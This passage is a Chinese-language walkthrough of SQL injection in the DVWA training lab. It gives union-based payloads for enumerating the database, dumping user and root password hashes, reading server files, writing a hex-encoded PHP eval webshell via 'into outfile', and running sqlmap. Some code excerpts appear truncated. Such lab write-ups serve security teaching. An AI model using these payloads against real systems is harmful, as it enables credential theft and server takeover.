7.获取数据
```
### Low
**服务器端核心代码**
```php
' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];
		// Feedback for end user
		$html .= "ID: {$id}First name: {$first}Surname: {$last}";
	}
	mysqli_close($GLOBALS["___mysqli_ston"]);
}
?>
```
由代码可知,通过 REQUEST 方式接受传递的参数 id,再通过 sql 语句带入查询,对来自客户端的参数 id 没有进行任何的检查与过滤,存在明显的 SQL 注入.
**漏洞利用**
1. 判断是否存在注入,注入是字符型还是数字型
    输入 `1`,查询成功:
    输入 `1'and '1' ='2`,查询失败,返回结果为空:
    输入 `1'or '1'='1`,查询成功:
    返回了多个结果,说明存在字符型注入.
    注: 关于数字型,字符型,搜索型的区别可以参考如下文章:https://blog.csdn.net/change518/article/details/8116920
2. 猜解 SQL 查询语句中的字段数
    输入 `1' or 1=1 order by 1 #`,查询成功:
    输入 `1' or 1=1 order by 2 #`,查询成功
    输入 `1' or 1=1 order by 3 #`,查询失败:
    说明执行的 SQL 查询语句中只有两个字段,即这里的 First name、Surname.
    (这里也可以通过输入 union select 1,2,3… 来猜解字段数)
3. 确定显示的字段顺序
    输入 `1' union select 1,2 #`,查询成功:
    说明执行的 SQL 语句为 select First name,Surname from 表 where ID=’id’…
4. 获取当前数据库
    输入 `1' union select 1,database() #`,查询成功:
	利用另一种方式 `1' union select user(),database() #`
    说明当前的数据库为 dvwa.
	union 查询结合了两个 select 查询结果,根据上面的 order by 语句我们知道查询包含两列,为了能够现实两列查询结果,我们需要用 union 查询结合我们构造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同.
5. 获取数据库中的表
    输入 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`,查询成功:
    说明数据库 dvwa 中一共有两个表,guestbook 与 users.
6. 获取表中的字段名
    输入 `1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`,查询成功:
    说明 users 表中有8个字段,分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login.
7. 获取数据
    输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`,查询成功:
	或 `1' union select null,concat_ws(char(32,58,32),user,password) from users #`
	或 `1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #`
    这样就得到了 users 表中所有用户的 user_id,first_name,last_name,password 的数据.
8. 猜 root 用户
	输入 `1' union select 1,group_concat(user,password) from mysql.user#`
	得到 root 用户信息:
9. 读文件和写入拿 webshell
	使用 mysql 的读写功能需要具有一定的权限.
	secure_file_priv 参数用来限制 load_file,into outfile 等相关读写执行函数作用于哪个指定目录.
	```
	当 secure_file_priv 的值为 null ,表示限制 mysqld 不允许导入|导出
	当 secure_file_priv 的值为/tmp/ ,表示限制 mysqld 的导入|导出只能发生在/tmp/目录下
	当 secure_file_priv 的值为/,表示限制 mysqld 的导入|导出的目录为所在的整个磁盘
	当 secure_file_priv 的值没有具体值时,表示不对 mysqld 的导入|导出做限制
	```
	通过命令查看 secure-file-priv 的当前值 `show global variables like '%secure%';`
	由于我使用的是 PHPStudy 搭建的环境,MySQL 没有设置过 secure_file_priv 时,默认为 NULL
	修改secure_file_priv为指定的目录:
	Windows下的配置文件:`../MySQL/my.ini`
	Linux下的配置文件:`/etc/mysql/my.cnf` (不同linux下的my.cnf位置路径不同,此处不一一列举)
	在[mysqld]内加入 `secure_file_priv = ` 注意这里为空,表示可以导入导出到任意目录,重启 mysql 服务
	- **`load_file()` 函数读取任意文件**
		`1' union select 1,load_file('C:\\phpStudy\\PHPTutorial\\WWW\\dvwa\\index.php')#`
	- **利用 `into outfile()` 函数写入一句话拿 webshell**
		不知道路径的情况下,先通过报错得出网站的绝对路径:`1' union select 'xx',2 into outfile 'xx'#`
		得到路径`C:\phpStudy\PHPTutorial\WWW\dvwa\vulnerabilities\sqli\source\low.php `
		直接 `into outfile` 一句话到根目录 `1' union select 1,'' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
		由于单引号会引起闭合而导致查询失败,注意一句话中的 cmd 不能是单引号,或者整句使用双引号 `1' union select 1,"" into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
		或者采用编码方式,如十六进制编码的方式 `1' union select 1,0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\\x.php'#`
**sqlmap**
`sqlmap -u "http:///dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=" --batch`
```
--cookie : 带 cookie 注入
--batch : 不要请求用户输入,使用默认行为
```
### Medium
**服务器端核心代码**
```php
' . mysqli_error($GLOBALS["___mysqli_ston"]) . '' );
	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Display values
		$first = $row["first_name"];
		$last  = $row["last_name"];
		// Feedback for end user
		$html .= "ID: {$id}First name: {$first}Surname: {$last}";
	}
}
// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
$number_of_rows = mysqli_fetch_row( $result )[0];
mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```
可以看到,Medium 级别的代码利用 mysql_real_escape_string 函数对特殊符号 `\x00,\n,\r,\,’,",\x1a` 进行转义,同时前端页面设置了下拉选择表单,希望以此来控制用户的输入.
**漏洞利用**
虽然前端使用了下拉选择菜单,但我们依然可以通过抓包改参数,提交恶意构造的查询参数.
1. 判断是否存在注入,注入是字符型还是数字型
    抓包更改参数 id 为 `1' or 1=1`,报错
    抓包更改参数 id 为 `1 or 1=1 #`,查询成功
    说明存在数字型注入.由于是数字型注入,服务器端的 mysql_real_escape_string 函数就形同虚设了,因为数字型注入并不需要借助引号.
2. 猜解 SQL 查询语句中的字段数
    抓包更改参数 id 为 `1 order by 2 #`,查询成功:
    抓包更改参数 id 为 `1 order by 3 #`,报错,说明执行的SQL查询语句中只有两个字段,即这里的 First name、Surname.
3. 确定显示的字段顺序
    抓包更改参数 id 为 `1 union select 1,2 #`,查询成功:
    说明执行的SQL语句为 `select First name,Surname from 表 where ID=id…`
4. 获取当前数据库
    抓包更改参数 id 为 `1 union select 1,database() #`
5. 获取数据库中的表
    抓包更改参数 id 为 `1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`
6. 获取表中的字段名
    抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #` ,查询失败
    这是因为单引号被转义了,变成了 `\’`.
    可以利用 16 进制进行绕过,抓包更改参数 id 为 `1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #`
    说明 users 表中有 8 个字段,分别是 user_id,first_name,last_name,user,password,avatar,last_login,failed_login.
7. 获取数据
    抓包修改参数 id 为 `1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`
**sqlmap**
抓包,把数据存到 1.txt
`sqlmap -r 1.txt`
```
-r 请求文件 从 HTTP 请求文件中加载
```
### High
**服务器端核心代码**
```php
Something went wrong.' );
	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];
		// Feedback for end user
		$html .= "ID: {$id}First name: {$first}Surname: {$last}";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
可以看到,与 Medium 级别的代码相比,High 级别的只是在 SQL 查询语句中添加了 LIMIT 1,希望以此控制只输出一个结果.
**漏洞利用**
虽然添加了 LIMIT 1,但是我们可以通过 `#` 将其注释掉.由于手工注入的过程与 Low 级别基本一样,直接最后一步演示获取数据.
输入 `1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #` ,查询成功:
需要特别提到的是,High 级别的查询提交页面与查询结果显示页面不是同一个,也没有执行 302 跳转,这样做的目的是为了防止一般的 sqlmap 注入,因为 sqlmap 在注入过程中,无法在查询提交页面上获取查询的结果,没有了反馈,也就没办法进一步注入.
可以通过指定 --second-url 去进行二阶注入
`sqlmap -r /root/1.txt -p id --second-url "http:///dvw/vulnerabilities/sqli/"`
### Impossible
**服务器端核心代码**
```php
prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
		$data->bindParam( ':id', $id, PDO::PARAM_INT );
		$data->execute();
		$row = $data->fetch();
		// Make sure only 1 result is returned
		if( $data->rowCount() == 1 ) {
			// Get values
			$first = $row[ 'first_name' ];
			$last  = $row[ 'last_name' ];
			// Feedback for end user
			$html .= "ID: {$id}First name: {$first}Surname: {$last}";
		}
	}
}
// Generate Anti-CSRF token
generateSessionToken();
?>